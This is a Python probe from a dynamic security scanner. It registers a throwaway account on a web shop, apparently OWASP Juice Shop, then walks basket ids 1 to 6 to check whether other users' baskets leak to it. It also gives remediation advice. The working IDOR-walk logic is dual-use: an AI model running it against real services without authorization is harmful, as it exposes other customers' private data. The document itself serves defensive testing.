#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Authorization (BOLA / IDOR): basket id walk reveals other users'
shopping baskets.

The endpoint serves /rest/basket/<id> by id. If the server returns
the basket without checking that the JWT's subject owns that id, an
attacker walks small integer ids and reads every other user's basket
contents.

Detection signal:
  Register a fresh user, log in, observe the user's own basket id,
  GET /rest/basket/<n> for n ∈ {1..6}, and confirm at least one
  basket returned has an id != the caller's AND a non-empty
  Products array (so we're not just hitting empty baskets).

Tested against:
  + OWASP Juice Shop  /rest/basket/1 (admin's basket) is returned
                      with Products to ANY authenticated user →
                      validated=True.
  + nginx default site → validated=False
"""
from __future__ import annotations

import json
import secrets
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

BASKET_PATH_TEMPLATE = "/rest/basket/{id}"
WHOAMI_PATH = "/rest/user/whoami"


def _register_and_login(client: SafeClient, origin: str) -> dict:
    """Create a throwaway user and return token + caller basket id."""
    email = f"basket-walk-{secrets.token_hex(6)}@dast.test"
    pw    = "Pr0be-" + secrets.token_hex(4)
    out: dict = {"email": email, "password": pw,
                 "token": None, "user_id": None, "bid": None}
    body = json.dumps({"email": email, "password": pw,
                       "passwordRepeat": pw,
                       "securityQuestion": {"id": 1},
                       "securityAnswer": "probe"}).encode()
    r = client.request("POST", urljoin(origin, "/api/Users"),
                       headers={"Content-Type": "application/json"},
                       body=body)
    out["register_status"] = r.status

    body = json.dumps({"email": email, "password": pw}).encode()
    r = client.request("POST", urljoin(origin, "/rest/user/login"),
                       headers={"Content-Type": "application/json"},
                       body=body)
    out["login_status"] = r.status
    if r.status == 200 and r.body:
        try:
            doc = json.loads(r.text) or {}
            auth = doc.get("authentication") or {}
            out["token"] = auth.get("token")
            out["bid"] = auth.get("bid") or auth.get("BasketId")
            out["user_id"] = auth.get("uid") or auth.get("id")
        except json.JSONDecodeError:
            pass
    return out


class BasketIdorWalkProbe(Probe):
    name = "authz_basket_idor_walk"
    summary = ("Detects basket-IDOR: walking small integer basket ids "
               "returns other users' baskets to a non-admin caller.")
    safety_class = "read-only"

    def add_args(self, parser):
        parser.add_argument(
            "--max-id", type=int, default=6,
            help="Walk basket ids 1..max-id (default 6).")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"

        sess = _register_and_login(client, origin)
        if not sess.get("token"):
            return Verdict(
                validated=False, confidence=0.6,
                summary=(f"Inconclusive: could not establish a probe "
                         f"session on {origin} (register "
                         f"{sess.get('register_status')} / login "
                         f"{sess.get('login_status')})."),
                evidence={"origin": origin, "session": {k: v for k, v
                                                        in sess.items()
                                                        if k != "password"}},
            )

        own_bid = sess.get("bid")
        token = sess["token"]
        attempts: list[dict] = []
        confirmed: list[dict] = []
        for bid in range(1, max(2, int(args.max_id)) + 1):
            url = urljoin(origin, BASKET_PATH_TEMPLATE.format(id=bid))
            r = client.request("GET", url, headers={
                "Authorization": f"Bearer {token}",
            })
            row: dict = {"basket_id_tried": bid, "status": r.status,
                         "size": r.size}
            if r.status == 200 and r.body:
                try:
                    doc = json.loads(r.text)
                except json.JSONDecodeError:
                    attempts.append(row); continue
                data = (doc.get("data") if isinstance(doc, dict) else None) or {}
                returned_id = data.get("id") if isinstance(data, dict) else None
                products = data.get("Products") or data.get("products") \
                    if isinstance(data, dict) else None
                row["returned_id"] = returned_id
                row["product_count"] = (len(products) if isinstance(products, list)
                                        else None)
                # Foreign basket = id we requested differs from our own.
                # We want a populated Products list to avoid noise from
                # empty baskets.
                if returned_id and own_bid and returned_id != own_bid \
                        and isinstance(products, list) and len(products) > 0:
                    row["foreign_basket"] = True
                    confirmed.append(row)
            attempts.append(row)
            if confirmed:
                break

        evidence = {"origin": origin, "own_basket_id": own_bid,
                    "session_email": sess.get("email"),
                    "attempts": attempts}
        if confirmed:
            top = confirmed[0]
            return Verdict(
                validated=True, confidence=0.95,
                summary=(f"Confirmed: basket IDOR on {origin} — basket "
                         f"id {top['basket_id_tried']} (foreign, owner "
                         f"is not our caller {own_bid}) returned "
                         f"{top['product_count']} product line(s) to "
                         "our session."),
                evidence={**evidence, "confirmed": confirmed},
                severity_uplift="critical",
                remediation=(
                    "Gate /rest/basket/<id> on `id == jwt.subject.bid`. "
                    "Reject (404 or 403) any request where the path "
                    "parameter doesn't match the caller's own basket. "
                    "More generally — every endpoint that takes an id "
                    "in the path must be paired with an authorization "
                    "check that the id belongs to the caller (or that "
                    "the caller has an explicit elevated role). This "
                    "is OWASP A01:2021 / API1:2023."),
            )
        return Verdict(
            validated=False, confidence=0.8,
            summary=(f"Refuted: walked {len(attempts)} basket ids on "
                     f"{origin}; no foreign basket leaked product data."),
            evidence=evidence,
        )


if __name__ == "__main__":
    BasketIdorWalkProbe().main()
